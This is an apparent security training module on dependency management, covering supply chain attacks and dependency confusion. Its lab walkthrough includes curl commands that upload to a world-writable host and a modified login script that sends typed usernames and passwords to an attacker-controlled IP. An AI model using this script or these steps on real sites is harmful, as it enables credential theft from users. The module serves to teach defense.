### Managing Dependencies Securely in Modern Applications

In today's software development world, it is rare to find an application that is built entirely from the ground up. In fact, doing so is generally discouraged because attempting to reinvent existing solutions can unintentionally introduce security vulnerabilities. Instead, modern software development relies heavily on external libraries and Software Development Kits (SDKs). These dependencies handle core features—ranging from basic to complex—allowing developers to focus on building the unique functionality of their application.

However, while these dependencies significantly enhance productivity, they also introduce a critical layer of risk. Since our application "depends" on these external resources, they can become an integral part of the overall attack surface. Thus, managing these dependencies securely is paramount.

This module will introduce the following key security concepts related to dependency management:

### **Learning Objectives:**
1. **Principles of Secure Dependency Management**: Understanding how to securely manage both external and internal dependencies, and why this is essential for application security.
2. **Securing Dependencies**: Methods for securing both external libraries and internal dependencies to prevent exploitation.
3. **Dependency Confusion Attacks**: Insight into a specific vulnerability within dependency management, where attackers exploit naming conflicts between public and private repositories, potentially leading to malicious code being executed within your application.

By understanding and mitigating risks associated with dependency management, you can greatly reduce the chance of your application becoming a target for attacks that exploit poorly secured dependencies.

## What are dependencies?

### The Scope of Dependencies in Modern Development

When you're developing an application, you might think that the code you write constitutes the majority of the logic and functionality. However, in reality, the bulk of the work is actually done by the dependencies you integrate into your project. To illustrate this, let's consider a simple Python example.

```python
# example.py
#!/usr/bin/python3
# Import the math dependency
import scipy
x = scipy.array([1, 2, 3, 4, 5])
y = scipy.array([6])
print(x * y)
```

In this example, we are using the **SciPy** library to create two arrays and multiply them. The logic we’ve written appears to be about four lines of code. However, that first line—`import scipy`—triggers the execution of an `__init__.py` file in the background, which contains hundreds of lines of code and additional dependencies. If we take a conservative estimate, this single import likely involves over 5,000 lines of code due to the dependencies SciPy itself relies on.

If we extrapolate this, you'll realize that the code you write makes up only a tiny fraction—perhaps 0.01%—of the total code running in your application. The remaining 99.99% is being executed by the libraries and dependencies your application relies on. This stark realization underscores the importance of managing dependencies effectively for the security of your entire development pipeline.

### The Importance of Dependency Management

Dependency management refers to the process of managing all the external libraries and modules your application depends on during its software development lifecycle (SDLC) and in your DevOps pipeline. Proper dependency management is crucial for several reasons:

- **Support and Maintenance**: Knowing exactly what dependencies your application uses makes it easier to support and maintain over time.
  
- **Version Locking**: To ensure stability, we often lock dependencies to specific versions. This way, we can prevent breaking changes that could result from new releases or deprecated features in newer versions.
  
- **Faster Deployments**: By creating "golden images" that already include the required dependencies, we can streamline deployments and reduce setup time in different environments.
  
- **Developer Onboarding**: When new developers join the team, a clear understanding of the required dependencies helps them set up their development environment quickly and consistently.
  
- **Security Monitoring**: Tracking the security status of your dependencies ensures that any known vulnerabilities are patched in a timely manner. This includes monitoring dependencies for security updates and ensuring they are upgraded as necessary.

In large organizations, dependency management is typically handled using tools like **Sonatype Nexus** or **Artifactory**. These tools centralize the management of all dependencies and integrate seamlessly into the DevOps pipeline. This allows automated build servers to request the necessary libraries and modules from a central repository whenever they need to build or deploy the application.

Managing dependencies is not just a matter of convenience; it’s an essential aspect of keeping your application secure, scalable, and maintainable. Without robust dependency management practices, your application could become a target for supply chain attacks or experience instability due to mismatched or outdated dependencies.


## Internal vs External

### Understanding Dependencies: External vs Internal

Dependencies in modern software development can come from various sources. For this context, we will primarily classify dependencies based on their origin—whether they are **external** or **internal** to our organization. Understanding these two categories helps us assess the appropriate security measures to apply to each type.

#### External Dependencies

An **external dependency** is one that originates outside of our organization. These dependencies are often publicly available and maintained by third-party entities. They can either be free or come with a paid license for access to advanced features. Common examples of external dependencies include:

- **Public package managers**: Any Python packages installed via **pip** from public repositories (like PyPI).
- **Web frameworks or libraries**: Popular JavaScript libraries, such as **React** or **Angular**, typically fetched via **npm** (Node Package Manager).
- **Third-party SDKs**: Libraries provided by external companies, such as **Google's reCAPTCHA** or **Stripe's payment SDK**, which integrate specific functionality into our applications.
  
Essentially, any dependency that originates outside your organization's own development efforts falls into the external category. While these dependencies can significantly speed up development, they also require ongoing scrutiny to ensure they are free from vulnerabilities and maintain security updates.

#### Internal Dependencies

An **internal dependency**, on the other hand, is developed within your organization. These dependencies are typically created to standardize functionality or improve efficiency across internally developed applications. Examples of internal dependencies include:

- **Authentication libraries**: Custom libraries that ensure uniform authentication practices across all internal applications (e.g., single sign-on or token-based authentication).
- **Database connectors**: Internal libraries that streamline connections to various data sources or facilitate database management.
- **Message parsing or conversion utilities**: Libraries designed to translate or transform data between different internal systems or formats.

Internal dependencies are created to avoid the need for duplicating common functions across multiple projects within your organization. Since these dependencies are built and maintained in-house, your organization is fully responsible for their upkeep and security.

#### External vs Internal: Security Considerations

The distinction between external and internal dependencies doesn't automatically imply that one is more secure than the other. However, the **attack surface** for each type differs, meaning each requires specific security measures to protect it adequately. 

1. **External Dependencies**: These can be prone to a variety of vulnerabilities, including supply chain attacks or issues that arise from improper or outdated versions. Since you're relying on external parties to maintain and patch these dependencies, you must regularly audit and update them. Furthermore, you should verify their integrity and trustworthiness by using techniques like version pinning or employing a dependency proxy for validation.
   
2. **Internal Dependencies**: While you have more control over internal dependencies, they can also introduce risks. Security vulnerabilities may exist in poorly written or under-maintained internal libraries. Unlike external dependencies, the responsibility for securing internal dependencies falls entirely on your organization. Proper code review practices, secure coding guidelines, and internal audits are crucial to protect these dependencies.

In the next steps, we will dive deeper into the specific security measures that should be implemented for both external and internal dependencies. We will also look at common vulnerabilities related to internal dependencies and explore ways to mitigate these risks effectively.


## Securing External Dependencies

When it comes to securing external dependencies, we face a unique challenge. External dependencies, by definition, are managed and updated by third parties outside of our direct control. While we aren’t directly responsible for maintaining the security of these dependencies, we must still actively manage them to ensure the security of our application. Let’s explore some of the security concerns around external dependencies and how they can be exploited, starting with vulnerabilities and supply chain attacks.

#### Public Vulnerabilities (CVEs)
External dependencies are written and maintained by human developers, and humans are prone to making mistakes. This means vulnerabilities can exist in the code, and when these vulnerabilities are discovered, they are typically disclosed publicly as **Common Vulnerabilities and Exposures (CVEs)**. While this is an important practice for ensuring that developers issue patches, it also creates a security risk for us—our version of the dependency may now be publicly vulnerable, and attackers can exploit it.

The challenge is that once a CVE is publicly announced, we need to act quickly to patch the vulnerability in our own code. However, this isn’t always straightforward. In some cases, we might have **version-locked** a dependency to ensure the stability of our application. Upgrading to a newer version may introduce instability or break features, making patching a complex decision. The situation worsens when we have dependencies of dependencies—where the dependency we are using might not be vulnerable, but one of its own dependencies is.

A notorious example of this problem was the **Log4j vulnerability**, which impacted thousands of applications due to its widespread use. The vulnerability allowed for **remote code execution**, making it a significant risk. When vulnerabilities like this are discovered, they affect not just the direct dependency but also all applications relying on it.

#### Supply Chain Attacks
Even if your dependencies are up to date and free of vulnerabilities, external dependencies can still be leveraged to compromise your application. As organizations bolster their own security defenses, attackers have adapted by targeting the **supply chain**—focusing on dependencies instead of directly attacking the application itself. These are known as **supply chain attacks**.

For instance, one notorious group, the **MageCart group**, became infamous for supply chain attacks that targeted e-commerce websites by compromising their third-party dependencies. Some of their high-profile attacks include:
- **British Airways**: Compromising the airline's online payment portal, stealing customer credit card information, and causing the company to face a fine of over $200 million.
- **AWS S3 Bucket Compromise**: The group compromised over 10,000 AWS S3 buckets and injected malicious JavaScript into vulnerable web pages.

These types of attacks are highly effective because compromising a single dependency can affect multiple applications, making the attack much more widespread.

The most common method of compromising dependencies is through insecure hosting. If a dependency is hosted on a public server (e.g., an **S3 bucket**) with improper access controls, an attacker could overwrite the dependency with malicious code, which would then be used by every application that relies on it.

#### Simulating a Supply Chain Attack
To simulate a **supply chain attack**, we can create a simple authentication portal and inject malicious code into an insecurely hosted dependency. For this demonstration, follow the steps below to simulate the attack:

1. **Setup**: Start the **AttackBox** machine and access the following URL via Firefox:
   ```
   http://<ATTACK_BOX_IP>:8000/
   ```
   This will bring up a simple authentication portal.

2. **Inject Hostname**: Before continuing, we need to simulate an **S3 bucket** hosting the dependency by adding an entry to your machine’s `/etc/hosts` file. Run the following command:
   ```bash
   sudo bash -c "echo '<ATTACK_BOX_IP> cdn.vulnerablewebsite.loc' >> /etc/hosts"
   ```
   This simulates the hostname of a malicious dependency server.

3. **Inspecting the Code**: Refresh the page and right-click to view the source code. You will see that the page loads a JavaScript dependency from `cdn.vulnerablewebsite.loc`. 

4. **Download the Dependency**: If you visit the dependency URL (e.g., `http://cdn.vulnerablewebsite.loc`), you can download a JavaScript file, such as `auth.js`, which is part of the authentication process.

   ```javascript
   var input = document.getElementById('txtPassword');
   input.addEventListener("keypress", function(event) {
       if (event.key == "Enter") {
           event.preventDefault();
           document.getElementById("loginSubmit").click();
       }
   });
   ```

   This is a benign script that auto-submits the login form when the "Enter" key is pressed. However, we can modify it to capture sensitive user credentials.

5. **Exploiting the Insecure Bucket**: If you check the `S3` bucket configuration, you might find that it is world-writable (i.e., allows unauthorized users to upload files). To confirm this, you can try sending a `PUT` request:
   ```bash
   curl -X PUT http://cdn.vulnerablewebsite.loc/libraries/test.js -d "Testing world-writeable permissions"
   ```
   If the request succeeds, this confirms that the bucket allows unauthorized file uploads. Now, you can upload your malicious JavaScript file.

6. **Inject the Malicious Script**: Modify the original `auth.js` to capture user credentials and send them to your server:
   ```javascript
   var input = document.getElementById('txtPassword');
   input.addEventListener("keypress", function(event) {
       if (event.key == "Enter") {
           event.preventDefault();
           try {
               const oReq = new XMLHttpRequest();
               var user = document.getElementById('txtUsername').value;
               var pass = document.getElementById('txtPassword').value;
               oReq.open("GET", "http://<YOUR_IP>:7070/item?user=" + user + "&pass=" + pass);
               oReq.send();
           } catch (err) {
               console.log(err);
           }
           function sleep(time) {
               return new Promise(resolve => setTimeout(resolve, time));
           }
           sleep(5000).then(() => {
               document.getElementById("loginSubmit").click();
           });
       }
   });
   ```
   This modified script collects the username and password from the login form and sends them to your server.

7. **Upload the Malicious Script**: Now, upload this malicious script to the insecure server:
   ```bash
   curl http://cdn.vulnerablewebsite.loc/libraries/auth.js --upload-file auth.js
   ```

8. **Intercept Credentials**: Set up a simple server on your machine to receive the intercepted credentials:
   ```bash
   python3 -m http.server 7070
   ```
   When a user submits their credentials on the login form, you will see the intercepted information in your server logs.

#### Defenses Against Supply Chain Attacks
While defending against supply chain attacks is difficult due to the vast number of external dependencies, several practices can help mitigate the risk:

- **Regular Updates and Patches**: Regularly update dependencies and apply patches, especially when critical vulnerabilities are disclosed.
- **Internal Hosting**: Where possible, host your own dependencies internally. This reduces the risk of an attacker compromising a third-party host.
- **Subresource Integrity (SRI)**: Use **SRI** to ensure that external JavaScript libraries are not tampered with. This involves adding a hash of the library to the HTML `script` tag, which modern browsers will use to verify the integrity of the file before loading it.

By implementing these measures, you can reduce the attack surface posed by external dependencies and better protect your application from supply chain attacks.

## Securing Internal Dependencies

Internal dependencies refer to libraries, frameworks, or SDKs developed within your organization. These are essential for standardizing processes across applications and reducing redundancy in code. However, since they are built and maintained internally, the responsibility for securing these dependencies falls squarely on your team. Let’s explore the key aspects of securing internal dependencies and how to mitigate potential risks.

#### Security Concerns
Internal dependencies carry many of the same security concerns as external dependencies, but with some additional risks. While these dependencies allow us to standardize critical processes—such as authentication, user registration, and inter-application communication—if a vulnerability exists, it can impact multiple applications across the organization.

Here are some specific concerns regarding internal dependencies:
- **Vulnerabilities Affect Multiple Applications**: Since internal dependencies are shared across different applications, a vulnerability in one of these dependencies could propagate to several systems within your organization. This makes it crucial to conduct regular security testing of these dependencies before their release.
  
- **Legacy Code**: Internal dependencies can quickly become **legacy code** if they are not actively maintained. If the original developer has moved on to other projects or left the company, the dependency might no longer receive necessary updates. Without updates, security vulnerabilities can go unpatched, especially if the code is used across multiple applications.

- **Lack of Documentation**: If the documentation for internal dependencies is not kept up to date, it can become difficult for new developers to take over responsibility for maintaining these libraries. This can lead to poor oversight, which in turn increases the risk of security gaps in the code.

- **Access Control and Permissions**: One of the unique security risks associated with internal dependencies is how they are stored and accessed. It's crucial to ensure that dependencies are accessible for use but not for modification by unauthorized personnel. If all developers have the ability to modify an internal dependency, a single compromised developer account could lead to widespread security issues. Therefore, strict **write-access controls** are essential. Some organizations even restrict **read access** to further reduce the potential attack surface.

#### Tools for Managing Internal Dependencies
To effectively manage and secure internal dependencies, organizations often rely on specialized tools. These tools help centralize and streamline the process of storing, accessing, and updating internal libraries. The specific tool used will depend on the technology stack and the requirements of your development teams.

1. **Single-Language Solutions**: If your organization primarily develops in one programming language, you could opt for a simple internal package repository. For example, if you're working with **Python**, hosting an internal **PyPi repository** would allow you to upload and distribute packages in much the same way as the public **PyPi repository**. This setup ensures that your internal Python packages are easy to install and manage.

2. **Multi-Language Solutions**: In organizations that develop in multiple languages, a more robust solution such as **JFrog Artifactory** can be used. Artifactory acts as a centralized repository for all dependencies—both internal and external. This allows your DevOps pipeline to pull dependencies automatically during the build and deployment process. Artifactory also supports versioning, access control, and integration with various build tools, making it ideal for teams working with multiple technologies.

While tools like Artifactory help streamline internal dependency management, they introduce risks if they are compromised. For instance, if an attacker were to gain access to your internal repository or dependency manager, the impact could be catastrophic. One type of attack that can target these systems is **Dependency Confusion**, which we will discuss in the next section.

#### Mitigating Security Risks
To secure your internal dependencies, you must implement several practices:
- **Regular Security Audits**: Conduct regular security reviews and audits of your internal dependencies to identify vulnerabilities before they are exploited.
- **Restrict Access**: Implement **role-based access controls** (RBAC) to ensure that only authorized personnel can modify or upload dependencies. This reduces the risk of an attacker compromising multiple applications by exploiting a single developer's account.
- **Active Maintenance**: Ensure that all internal dependencies are actively maintained. This means addressing any bugs, security vulnerabilities, or deprecated features as soon as they are discovered. Setting up a policy for maintaining internal libraries will help prevent them from becoming "forgotten" legacy code.
- **Centralized Management**: Use dependency management tools, like **JFrog Artifactory** or an internal **PyPi server**, to centralize and control access to dependencies. This makes it easier to track and update dependencies in a secure, organized manner.
  
By securing both the internal storage and the access to these dependencies, you can minimize the attack surface and reduce the chances of an attacker exploiting vulnerabilities in your organization's shared code base.

## Theory of Dependency Confusion

**Dependency Confusion** is a security vulnerability that arises when an organization uses internal dependencies managed through a dependency manager. This issue can create a race condition, allowing an attacker to introduce a malicious dependency into the build process. In this section, we’ll explore the theory behind this vulnerability and examine how it can be exploited in a DevSecOps pipeline.

#### Background

Dependency Confusion was first identified by security researcher Alex Birsan in 2021. The issue occurs due to the way internal dependencies are managed and integrated into development pipelines. Let’s consider a simple example using Python:

```bash
pip install numpy
```

When this command is executed, `pip` connects to a public package repository (like **PyPi**) to fetch the latest version of the **numpy** package. If an attacker wants to compromise the package, there are several strategies they could use to tamper with the supply chain:

- **Typosquatting**: An attacker creates a malicious package with a name similar to the intended one (e.g., **nunpy** instead of **numpy**) to catch developers who make typographical errors.
- **Source Injection**: An attacker submits a pull request with malicious code embedded in an otherwise legitimate package. This could lead to a vulnerability that affects all applications using the compromised package.
- **Domain Expiry**: Developers may forget to renew the domain associated with their package’s email service. Attackers could then purchase the expired domain and gain control over the package maintainers’ emails, which could allow them to reset passwords and take control of the package itself.

These attack methods focus on targeting either the package or its maintainers directly. Now, consider how dependency confusion can occur when internal and external packages are managed side by side.

#### Creating the Dependency Confusion Vulnerability

Let’s say your organization uses an internal PyPi server to manage dependencies. Developers might install internal dependencies by using a command like:

```bash
pip install numpy --extra-index-url https://our-internal-pypi-server.com/
```

This command directs `pip` to also check your internal PyPi server for the **numpy** package. However, here’s where the issue arises: if a package with the same name (**numpy**) exists both on your internal server and on a public repository like **PyPi**, how does `pip` know which one to install?

In this case, `pip` will compare the versions of both packages and choose the one with the highest version number. If the attacker manages to publish a version of the package with a higher version number than the internal one, `pip` will download and install the attacker’s version, leading to a **dependency confusion attack**.

#### Staging a Dependency Confusion Attack

To launch a dependency confusion attack, an attacker only needs to discover the name of one of your internal dependencies. While this might seem challenging, there are common ways this information can be leaked:

- Developers may publicly share details about the internal libraries they are using on forums like StackOverflow, without obfuscating library names.
- Certain applications (such as Node.js) may expose internal package names in their configuration files (e.g., **package.json**), which could be visible in the application or even in public repositories.

Once an attacker identifies the name of an internal dependency, they can create a malicious package with the same name and publish it to a public repository, ensuring the version number is higher than that of the internal package. This would confuse the build pipeline, causing it to pull in the malicious package from the public repository instead of the legitimate internal one.

#### Key Considerations

When executing a dependency confusion attack, there are a few important factors to keep in mind:

1. **Build Failures**: Since the attacker does not have access to the actual source code of the internal dependency, the build process will likely fail at a later step. This is because the malicious package cannot provide the functionality or code required by the application.
   
2. **Version Number Manipulation**: To ensure the confusion works in their favor, the attacker must set the version number of their malicious package higher than that of the internal one. This is usually easy to achieve, as many packages have a major version number lower than 10, so a version like `9000` would be enough to confuse most dependency managers.

3. **Dependency Type**: Dependency confusion can affect any kind of package managed through a dependency manager. Whether it’s a **Python** package using `pip`, a **JavaScript** package managed with `npm`, or a **Ruby** gem, this attack vector is applicable to all types of dependencies.

For simplicity, this attack is often demonstrated using Python, but the same principles apply across different languages and ecosystems.

#### Conclusion

Dependency Confusion represents a serious risk to organizations that rely on both internal and external package repositories. If attackers can manipulate the versioning of internal dependencies and exploit this race condition, they could compromise the security of your entire application ecosystem. In the next section, we will explore how this attack can be practically executed in a controlled environment.


